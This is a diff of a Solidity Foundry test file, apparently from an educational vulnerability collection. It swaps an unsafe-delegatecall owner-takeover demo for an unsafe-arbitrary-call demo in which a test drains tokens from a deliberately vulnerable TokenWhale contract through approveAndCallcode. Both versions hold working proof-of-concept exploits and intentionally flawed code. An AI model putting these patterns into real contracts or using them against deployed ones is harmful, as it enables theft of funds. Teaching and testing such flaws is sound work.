@@ -1,78 +1,141 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.18;
 
-import "forge-std/Test.sol";
-
 /*
-Name: Unsafe Delegatecall Vulnerability
+Name: Unsafe Call Vulnerability
 
 Description:
-The Proxy Contract Owner Manipulation Vulnerability is a flaw in the smart contract design that
-allows an attacker to manipulate the owner of the Proxy contract, which is hardcoded as 0xdeadbeef.
-The vulnerability arises due to the use of delegatecall in the fallback function of the Proxy contract. 
-delegatecall allows an attacker to invoke the pwn() function from the Delegate contract within the context 
-of the Proxy contract, thereby changing the value of the owner state variable of the Proxy contract.
-This allows a smart contract to dynamically load code from a different address at runtime.
+In TokenWhale contract's approveAndCallcode function. The vulnerability allows an 
+arbitrary call to be executed with arbitrary data, leading to potential security risks
+and unintended consequences. The function uses a low-level call (_spender.call(_extraData))
+to execute code from the _spender address without any validation or checks on the provided _extraData.
+This can lead to unexpected behavior, reentrancy attacks, or unauthorized operations.
 
-Scenario:
-Proxy Contract is designed for helping users call logic contract
-Proxy Contract's owner is hardcoded as 0xdeadbeef
-Can you manipulate Proxy Contract's owner ?
+This excersise is about  a low level call to a contract where input and return values are not checked
+If the call data is controllable, it is easy to cause arbitrary function execution.
 
 Mitigation:
-To mitigate the Proxy Contract Owner Manipulation Vulnerability, 
-avoid using delegatecall unless it is explicitly required, and ensure that the delegatecall is used securely. 
-If the delegatecall is necessary for the contract's functionality, make sure to validate and 
-sanitize inputs to avoid unexpected behaviors.
+Use of low level "call" should be avoided whenever possible.  
+
+REF
+https://blog.li.fi/20th-march-the-exploit-e9e1c5c03eb9
 */
- 
-contract Proxy {
-    address public owner = address(0xdeadbeef); // slot0
-    Delegate delegate;
 
-    constructor(address _delegateAddress) public {
-        delegate = Delegate(_delegateAddress);
-    }
-
-    fallback() external {
-        (bool suc, ) = address(delegate).delegatecall(msg.data); // vulnerable
-        require(suc, "Delegatecall failed");
-    }
-}
+import "forge-std/Test.sol";
 
 contract ContractTest is Test {
-    Proxy proxy;
-    Delegate DelegateContract;
-    address alice;
+    TokenWhale TokenWhaleContract;
 
-    function setUp() public {
-        alice = vm.addr(1);
-    }
-
-    function testDelegatecall() public {
-        DelegateContract = new Delegate(); // logic contract
-        proxy = new Proxy(address(DelegateContract)); // proxy contract
-
-        console.log("Alice address", alice);
-        console.log("DelegationContract owner", proxy.owner());
-
-        // Delegatecall allows a smart contract to dynamically load code from a different address at runtime.
-        console.log("Change DelegationContract owner to Alice...");
-        vm.prank(alice);
-        address(proxy).call(abi.encodeWithSignature("pwn()")); // exploit here
-        // Proxy.fallback() will delegatecall Delegate.pwn()
-
-        console.log("DelegationContract owner", proxy.owner());
+    function testUnsafeCall() public {
+        address alice = vm.addr(1);
+        TokenWhaleContract = new TokenWhale();
+        TokenWhaleContract.TokenWhaleDeploy(address(TokenWhaleContract));
         console.log(
-            "Exploit completed, proxy contract storage has been manipulated"
+            "TokenWhale balance:",
+            TokenWhaleContract.balanceOf(address(TokenWhaleContract))
+        );
+
+        // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000);
+
+        console.log(
+            "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
+        );
+        vm.prank(alice);
+        TokenWhaleContract.approveAndCallcode(
+            address(TokenWhaleContract),
+            0x1337, // doesn't affect the exploit
+            abi.encodeWithSignature(
+                "transfer(address,uint256)",
+                address(alice),
+                1000
+            )
+        );
+
+        // check if the exploit is successful
+        assertEq(TokenWhaleContract.balanceOf(address(alice)), 1000);
+        console.log("Exploit completed");
+        console.log(
+            "TokenWhale balance:",
+            TokenWhaleContract.balanceOf(address(TokenWhaleContract))
+        );
+        console.log(
+            "Alice balance:",
+            TokenWhaleContract.balanceOf(address(alice))
         );
     }
+
+    receive() external payable {}
 }
 
-contract Delegate {
-    address public owner; // slot0
+contract TokenWhale {
+    address player;
 
-    function pwn() public {
-        owner = msg.sender;
+    uint256 public totalSupply;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    string public name = "Simple ERC20 Token";
+    string public symbol = "SET";
+    uint8 public decimals = 18;
+
+    function TokenWhaleDeploy(address _player) public {
+        player = _player;
+        totalSupply = 1000;
+        balanceOf[player] = 1000;
+    }
+
+    function isComplete() public view returns (bool) {
+        return balanceOf[player] >= 1000000; // 1 mil
+    }
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    function _transfer(address to, uint256 value) internal {
+        balanceOf[msg.sender] -= value;
+        balanceOf[to] += value;
+
+        emit Transfer(msg.sender, to, value);
+    }
+
+    function transfer(address to, uint256 value) public {
+        require(balanceOf[msg.sender] >= value);
+        require(balanceOf[to] + value >= balanceOf[to]);
+
+        _transfer(to, value);
+    }
+
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+
+    function approve(address spender, uint256 value) public {
+        allowance[msg.sender][spender] = value;
+        emit Approval(msg.sender, spender, value);
+    }
+
+    function transferFrom(address from, address to, uint256 value) public {
+        require(balanceOf[from] >= value);
+        require(balanceOf[to] + value >= balanceOf[to]);
+        require(allowance[from][msg.sender] >= value);
+
+        allowance[from][msg.sender] -= value;
+        _transfer(to, value);
+    }
+
+    /* Approves and then calls the contract code*/
+
+    function approveAndCallcode(
+        address _spender,
+        uint256 _value,
+        bytes memory _extraData
+    ) public {
+        allowance[msg.sender][_spender] = _value;
+
+        bool success;
+        // vulnerable call execute unsafe user code
+        (success, ) = _spender.call(_extraData);
+        console.log("success:", success);
     }
 }
